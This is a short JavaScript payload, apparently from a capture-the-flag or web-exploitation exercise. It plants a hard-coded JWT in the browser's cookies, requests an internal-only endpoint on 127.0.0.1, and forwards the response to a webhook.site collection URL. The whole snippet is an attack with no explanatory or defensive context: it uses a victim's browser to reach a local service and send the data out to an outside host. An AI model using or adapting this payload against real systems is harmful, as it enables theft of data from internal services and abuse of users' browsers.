function setCookie(name, value) {
    document.cookie = `${name}=${encodeURIComponent(value)}`;
}

setCookie('jwt', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjVhYTc3ZDU5LTM5M2ItNGFhMi04YjJiLTYyMTY1YTg2MTM3MiIsInJvbGUiOiJndWVzdCIsImVtYWlsIjoidGVzQHRlcy5jb20iLCJiYWxhbmNlIjo0MDAsImlhdCI6MTc5MTUwOTk4N30.jEYa5jbvcJQWv5QzNIm5RZvjbv8777-7_I3P3FtLd7A');

fetch('http://127.0.0.1:3314/api/generate')
  .then(r => r.text())
  .then(data => {
    fetch(`https://webhook.site/f2911ad9-1391-4bab-8584-0a6484b8c73d?response=${encodeURIComponent(data)}`);
  });
